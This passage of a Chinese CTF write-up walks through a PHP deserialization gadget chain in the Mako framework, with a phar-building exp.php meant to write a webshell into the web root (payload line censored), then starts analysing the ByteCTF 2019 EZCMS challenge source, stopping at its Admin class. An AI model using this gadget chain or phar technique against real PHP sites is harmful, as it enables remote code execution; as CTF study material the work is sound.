<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Session.<span class="title function_ invoke__">__destruct</span>().<span class="title function_ invoke__">commit</span>()-&gt;</span><br><span class="line">File.<span class="title function_ invoke__">write</span>()-&gt;</span><br><span class="line">FileSystem.<span class="title function_ invoke__">put</span>()</span><br></pre></td></tr></table></figure>
<p>在Session.php中的__destruct(),具有自动提交会话数据的commit,数据传到File</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Replace old flash data with new</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sessionData[<span class="string">&#x27;mako.flashdata&#x27;</span>] = <span class="variable language_">$this</span>-&gt;flashData;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Write session data</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;destroyed)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;sessionId, <span class="variable">$this</span>-&gt;sessionData, <span class="variable">$this</span>-&gt;options[<span class="string">&#x27;data_ttl&#x27;</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在File.write()中存在写入功能点，链子利用的就是这个，接着看下一个功能点。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessionId</span>, <span class="keyword">array</span> <span class="variable">$sessionData</span>, <span class="keyword">int</span> <span class="variable">$dataTTL</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">isWritable</span>(<span class="variable">$this</span>-&gt;sessionPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">put</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sessionFile</span>(<span class="variable">$sessionId</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$sessionData</span>)) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>fileSystem.php中的put()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$lock</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>, <span class="variable">$lock</span> ? LOCK_EX : <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_put_contents():</p>
<p>功能：把一个字符串写入文件中。</p>
<p>语法：<code>file_put_contents(file,data,mode,context)</code></p>
<p>参数说明：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>file</em></td>
<td>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</td>
</tr>
<tr>
<td><em>data</em></td>
<td>可选。规定要写入文件的数据。可以是字符串、数组或数据流。</td>
</tr>
<tr>
<td><em>mode</em></td>
<td>可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td><em>context</em></td>
<td>可选。规定文件句柄的环境。<em>context</em> 是一套可以修改流的行为的选项。若使用 null，则忽略</td>
</tr>
</tbody>
</table>
<p>参数 <em>data</em> 可以是数组（但不能是多维数组）。</p>
<p>自 PHP 5.1.0 起，<em>data</em> 参数也可以被指定为 stream 资源，stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。</p>
<p>对 <em>context</em> 参数的支持是 PHP 5.0.0 添加的。</p>
<hr>
<p>这里就可以利用将我们想写入的数据写进容器中，理论成立，实践开始，我这里就直接用maxzed的exp啦，将shell写在/var/www/mako/public下。</p>
<p>exp.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span><span class="string">&#x27;);//由于要存本地，这个先和谐一下</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\session\stores&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\file\FileSystem;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    class File&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        protected $fileSystem;</span></span><br><span class="line"><span class="string">        protected $sessionPath;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;fileSystem = new FileSystem();</span></span><br><span class="line"><span class="string">            $this-&gt;sessionPath = &quot;/var/www/mako/public&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\file&#123;</span></span><br><span class="line"><span class="string">    class FileSystem&#123;</span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\session\Session;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span></span><br><span class="line"><span class="string">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span></span><br><span class="line"><span class="string">    $o = new Session();</span></span><br><span class="line"><span class="string">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="string">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;asd&quot;); //添加要压缩的文件</span></span><br><span class="line"><span class="string">//签名自动计算</span></span><br><span class="line"><span class="string">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>接下来就是常规获取shell了，但是我自己本地搭的docker传上去的phar.phar没反应，没法读取，没能复现成功。<s>被迫换题说</s></p>
<h4 id="byte2019ezcms"><a class="markdownIt-Anchor" href="#byte2019ezcms"></a> Byte2019EZCMS</h4>
<p>题目靶场：[NSSCTF - <a target="_blank" rel="noopener" href="https://www.ctfer.vip/problem/190">ByteCTF 2019]EZCMS (ctfer.vip)</a></p>
<p>题目考点：源码泄露、MD5长度攻击、phar反序列化</p>
<h5 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程：</h5>
<p>​      拿到题目，扫了一下目录，发现存在www.zip，访问www.zip获得源码 ，分析源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$password</span> === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;u r not admin !!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href=&quot;upload.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    这里就是，只要passwor不是admin都可以登录进去，但是登录进去却不能上传文件</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221009185109443-166727395787418.png" alt="test05"></p>
<p>到这儿，就得去整体分析源码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;EzCMS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Upload platform&lt;/h2&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;假装这还是个无敌炫酷的前端&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;upload&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;view my file : &quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$filename</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$filename</span> != <span class="string">&#x27;..&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$v</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;width: 1000px; height: 30px;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;Ariel&gt;filename: <span class="subst">&#123;$v&#125;</span>&lt;/Ariel&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;view.php?filename=<span class="subst">&#123;$v&#125;</span>&amp;filepath=<span class="subst">&#123;$filepath&#125;</span>&quot;&gt;view detail&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在index.php里，我们传入username和password，密码不能为admin即可正常登录，赋值给session接下来调用了login()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;adminadmin&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>login函数将密钥和adminadmin拼接。然后MD5加密。赋值给cookies[‘hash’]<br>
也就是说。我们登陆成功后。会有一个cookie hash:md5(密钥+‘adminadmin’)<br>
继续往下看。登陆成功后。会到upload页面。上传文件显示不是admin。那么我们就着重看下这部分代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="comment">//上传中的一些操作，给变量赋值啥的。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里程序调用了admin类中的upload_file功能，接着往下看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_dir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content_check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$file_tmp</span>, <span class="variable">$size</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upload_dir = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$size</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_tmp = <span class="variable">$file_tmp</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check = <span class="keyword">new</span> <span class="title class_">Check</span>(<span class="variable language_">$this</span>-&gt;file_tmp);</span><br><span class="line">        <span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker = <span class="variable">$profile</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
